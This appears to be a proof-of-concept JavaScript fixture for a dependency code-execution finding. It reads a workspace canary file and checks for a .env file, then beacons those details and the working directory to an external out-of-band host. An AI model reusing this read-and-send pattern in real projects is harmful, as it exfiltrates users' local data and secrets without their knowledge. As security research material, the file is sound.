// ARC-127 test fixture: reads ONLY the local canary file and reports it to a
// researcher-controlled OOB endpoint. It never reads .env contents.
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');

const dependencyDir = __dirname;
const repoDir = path.resolve(dependencyDir, '..');
const workspaceRoot = path.resolve(dependencyDir, '../..');
const canaryPath = path.join(workspaceRoot, 'ARC127_CANARY.txt');

let token = 'NO_CANARY';
let canaryRead = 'fail:unknown';
try {
  token = fs.readFileSync(canaryPath, 'utf8').trim();
  canaryRead = 'ok';
} catch (e) {
  canaryRead = 'fail:' + e.code;
}

const envExists = fs.existsSync(path.join(workspaceRoot, '.env'));

const lines = [
  'ARC127_EXECUTED',
  'utc=' + new Date().toISOString(),
  'cwd=' + process.cwd(),
  'dependency_dir=' + dependencyDir,
  'workspace_root=' + workspaceRoot,
  'canary_read=' + canaryRead,
  'canary_token=' + token,
  'env_exists=' + envExists,
  'node=' + process.version
];
fs.writeFileSync(path.join(repoDir, 'ARC127_EXECUTED'), lines.join('\n') + '\n');

const oob = 'https://dbcpvcqk0biu3ol49bk0x9njzki1ibra5.oast.site/arc127-poc';
const url = oob +
  '?token=' + encodeURIComponent(token) +
  '&env_exists=' + envExists +
  '&canary_read=' + encodeURIComponent(canaryRead) +
  '&cwd=' + encodeURIComponent(process.cwd());
const mod = url.indexOf('https:') === 0 ? https : http;
const req = mod.get(url, function (res) { res.resume(); });
req.on('error', function (e) {
  fs.appendFileSync(path.join(repoDir, 'ARC127_EXECUTED'), 'oob_error=' + e.message + '\n');
});
